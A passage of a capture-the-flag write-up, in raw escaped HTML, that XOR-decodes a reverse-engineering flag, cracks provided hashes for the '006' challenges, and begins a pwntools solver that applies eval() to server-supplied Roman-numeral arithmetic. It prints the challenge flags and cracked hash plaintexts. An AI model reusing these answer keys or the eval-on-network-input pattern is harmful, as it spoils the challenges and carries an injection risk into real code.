style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0a&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;90&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;eb&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;04&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;d0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;4b&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;88&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;bd&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e8&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0c&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;11&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;04&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;11&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;f8&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;48&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e9&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;04&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;b0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;8d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;07&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;dd&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;4d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;88&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;32&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# accessing data_at_105ac with the offsets specified
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(offsets)):
&lt;&#x2F;span&gt;&lt;span&gt;  off &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(offsets[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(data_at_105ac[off]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[i])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#byuctf{1_h0p3_ARM_wasn&amp;#39;t_t00_b4d_0f_4_tw1st}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Oooooofff, finally :)&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{1_h0p3_ARM_wasn&#x27;t_t00_b4d_0f_4_tw1st}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;misc&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc&quot; aria-label=&quot;Anchor link for: misc&quot;&gt;Misc&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;006-i-006-ii-006-iii&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#006-i-006-ii-006-iii&quot; aria-label=&quot;Anchor link for: 006-i-006-ii-006-iii&quot;&gt;006-I, 006-II, 006-III&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Solution to these 3 challenges are just cracking the hashes provided in the challenge.&lt;&#x2F;p&gt;
&lt;p&gt;The hashes given are&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;006I 	- fb77dc5534f88d45fa2985d92a68c60c
&lt;&#x2F;span&gt;&lt;span&gt;006II   - cdd0525ea8565802b35dc5d71757a6497953050d
&lt;&#x2F;span&gt;&lt;span&gt;006III  - 
&lt;&#x2F;span&gt;&lt;span&gt;6328C530F895CA13C75E161DEC260EC2C0BED4FCFF1B34448EA16A7FFFFA5CDC403E5CC83B23321E9AD3280952BE2ADB037DD7AFA3084B7E940C6A655B2F13BA
&lt;&#x2F;span&gt;&lt;span&gt;3FAE7E18F9004673D0E68CA10264A1ABAF76FBF42E60D960A1B95289401146E4BF39E599641C730DB8F664F7F1DD02F171BEB4730AC756AAC7CF40C6BC4D623A
&lt;&#x2F;span&gt;&lt;span&gt;5C6E3A016FC76F6EC3E062F266977A2C32FD875F0911323256B50A7AA6E24A8C0AD4E6225CA07A73BA1487A83AD7F058CE77345969F1FC04FD6168C15A39EB00
&lt;&#x2F;span&gt;&lt;span&gt;A7383D14CF904E91C0F0226CC926CC6CA7CF91F1907025AE961627B444C412247823DA87C3AF69D8A490538554F6E59E972D4EE861726A7B2B3D808CD5096A5B
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using &lt;strong&gt;crackstation&lt;&#x2F;strong&gt; and &lt;strong&gt;hashesh.com&lt;&#x2F;strong&gt; the hashes can be cracked.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Flags 
&lt;&#x2F;span&gt;&lt;span&gt;006I 	- byuctf{brittishhottie}
&lt;&#x2F;span&gt;&lt;span&gt;006II 	- byuctf{Arkhangelsk}
&lt;&#x2F;span&gt;&lt;span&gt;006III 	- byuctf{goldeneye007_goldeneye641_goldeneye069_goldeneye159}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;xkcd-2637&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#xkcd-2637&quot; aria-label=&quot;Anchor link for: xkcd-2637&quot;&gt;xkcd 2637&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Saw this and just couldn&amp;#39;t resist.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;`nc byuctf.xyz 40014`
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The challenge is to solve &lt;a href = &quot;https:&#x2F;&#x2F;xkcd.com&#x2F;2637&#x2F;&quot; target=_blank&gt;xkcd2637&lt;&#x2F;a&gt; calculations. But we have to solve 500 problems displayed on the nc connection. So Here is the solution script to solve.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;re
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solution&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#mapping
&lt;&#x2F;span&gt;&lt;span&gt;	num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;900&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;500&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;400&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;	sym &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;M&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;CM&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;CD&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;C&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;XC&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;L&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;XL&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;X&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;IX&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;V&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;IV&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;I&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	lsh &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;l[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;	op &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;l[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;	rsh &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;l[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(num)):
&lt;&#x2F;span&gt;&lt;span&gt;		lsh &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sub&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(num[i])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;sym[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;lsh)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(num)):
&lt;&#x2F;span&gt;&lt;span&gt;		rsh &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sub&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(num[i])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;sym[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;rsh)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	lsh_num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;roman_to_int&lt;&#x2F;span&gt;&lt;span&gt;(lsh)
&lt;&#x2F;span&gt;&lt;span&gt;	rsh_num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;roman_to_int&lt;&#x2F;span&gt;&lt;span&gt;(rsh)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	equation &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(lsh_num)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;op&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(rsh_num)
&lt;&#x2F;span&gt;&lt;span&gt;	ans &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(equation)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	ans_roman &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;int_to_roman&lt;&#x2F;span&gt;&lt;span&gt;(ans)
&lt;&#x2F;span&gt;&lt;span&gt;
